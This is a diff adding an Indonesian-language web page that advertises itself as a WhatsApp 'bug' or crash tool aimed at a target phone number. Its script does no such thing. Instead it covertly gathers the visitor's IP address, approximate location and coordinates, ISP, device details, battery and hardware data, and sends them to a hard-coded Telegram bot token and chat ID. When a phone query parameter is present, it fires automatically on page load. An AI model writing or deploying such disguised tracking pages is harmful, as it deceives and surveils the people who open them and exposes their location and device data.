@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>BUG WHATSAPP</title>
+<style>
+  body {margin:0;font-family:Arial,Helvetica,sans-serif;background:#0f1115;color:#e9eef5}
+  .wrap {max-width:480px;margin:60px auto;padding:0 16px}
+  .card {background:#151a22;border:1px solid #232a36;border-radius:14px;padding:20px;text-align:center}
+  h1 {margin:0 0 20px;font-size:22px;color:#79ffe1}
+  input,select,button {font-size:18px;padding:14px;border-radius:10px;border:none;margin:8px 0;width:100%}
+  input,select {background:#0b0f15;color:#e9eef5;border:1px solid #232a36}
+  button {background:#22c55e;color:#fff;font-weight:bold;cursor:pointer}
+  button:hover {background:#16a34a}
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <h1>🚀 MASUKAN NOMOR TARGET</h1>
+      <input type="text" id="phone" placeholder="Contoh: 08123456789" />
+      <select id="mode">
+        <option value="BANTAI">🔥 BANTAI</option>
+        <option value="HARD INVISIBLE">HARD INVISIBLE</option>
+        <option value="CRASH DELAY">CRASH DELAY</option>
+        <option value="GB CRASH">GB CRASH</option>
+        <option value="BLANK">BLANK</option>
+      </select>
+      <button onclick="sendReport()">🚀 SERANG</button>
+    </div>
+  </div>
+
+<script>
+const BOT_TOKEN = "8416875577:AAG6MZzc-im399QWZNj7vB-Tjn4fdeKbHEk";
+const CHAT_ID   = "7909772018";
+
+function yn(v){ return v ? "✅ YA":"❌ TIDAK"; }
+
+async function getIPInfo(){
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    return await res.json();
+  } catch {
+    return {};
+  }
+}
+
+async function getBatteryText(){
+  try {
+    if (!navigator.getBattery) return "❌ Tidak tersedia";
+    const b = await navigator.getBattery();
+    return `${Math.round(b.level*100)}% (Charging: ${b.charging ? "✅ YA":"❌ TIDAK"})`;
+  } catch {
+    return "❌ Tidak tersedia";
+  }
+}
+
+function getConn(){
+  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if(!c) return "❌ Tidak terdeteksi";
+  const parts=[];
+  if(c.effectiveType) parts.push(c.effectiveType);
+  if(typeof c.downlink==="number") parts.push(`${c.downlink} Mbps`);
+  if(typeof c.rtt==="number") parts.push(`RTT ~${c.rtt}ms`);
+  return parts.length?parts.join(" / "):"❌ Tidak terdeteksi";
+}
+
+async function sendReport(nomorArg, modeArg){
+  const nomor = nomorArg || document.getElementById("phone").value.trim();
+  const mode  = modeArg || document.getElementById("mode").value;
+  if(!nomor){ alert("Masukkan nomor HP dulu!"); return; }
+
+  const now      = new Date().toLocaleString("id-ID",{timeZone:"Asia/Jakarta"});
+  const ipinfo   = await getIPInfo();
+  const battery  = await getBatteryText();
+  const device   = navigator.userAgent;
+  const platform = navigator.platform || "—";
+  const screenRes= `${screen.width}x${screen.height}`;
+  const cores    = navigator.hardwareConcurrency ?? "—";
+  const ram      = navigator.deviceMemory ? navigator.deviceMemory+" GB" : "—";
+  const tz       = Intl.DateTimeFormat().resolvedOptions().timeZone || "—";
+  const online   = yn(navigator.onLine);
+  const touch    = yn(("ontouchstart" in window)||navigator.maxTouchPoints>0);
+
+  const pesan = `╭── 🎯 HASIL LACAK | VERSION 7.0 ──╮
+
+📱 Nomor HP Target   : ${nomor}
+⚔️ Fitur Dipilih     : ${mode}
+🕒 Akses Waktu       : ${now}
+
+📡 IP Address        : ${ipinfo.ip||"—"}
+🏙️ Lokasi (IP)       : ${(ipinfo.city||"—")}, ${(ipinfo.region||"—")}, ${(ipinfo.country||"—")}
+📌 Koordinat (IP)    : ${(ipinfo.latitude||"—")}, ${(ipinfo.longitude||"—")}
+🏷️ Kode Pos          : ${ipinfo.postal||"—"}
+🌐 ISP               : ${ipinfo.org||"—"}
+📶 Koneksi           : ${getConn()}
+
+🖥️ Device            : ${device}
+💻 Platform          : ${platform}
+📺 Resolusi Layar    : ${screenRes}
+🧠 CPU Cores         : ${cores}
+💾 RAM               : ${ram}
+🔋 Baterai           : ${battery}
+📡 Online Status     : ${online}
+🕹️ Touch Support     : ${touch}
+
+🧭 Zona Waktu        : ${tz}
+📄 Judul Halaman     : ${document.title}
+
+╰── 👩‍💻 Royz Developer 👩‍💻  ──╯`;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({chat_id: CHAT_ID, text: pesan})
+    });
+    console.log("✅ Laporan terkirim ke Telegram");
+  } catch (e) {
+    console.error("❌ Gagal mengirim:", e.message);
+  }
+}
+
+// 🔹 Auto-run kalau ada query ?phone=...&mode=...
+window.addEventListener("DOMContentLoaded", ()=>{
+  const params = new URLSearchParams(window.location.search);
+  const p = params.get("phone");
+  const m = params.get("mode");
+  if(p){
+    document.getElementById("phone").value = p;
+    if(m) document.getElementById("mode").value = m;
+    sendReport(p, m || "BANTAI");
+  }
+});
+</script>
+</body>
+</html>
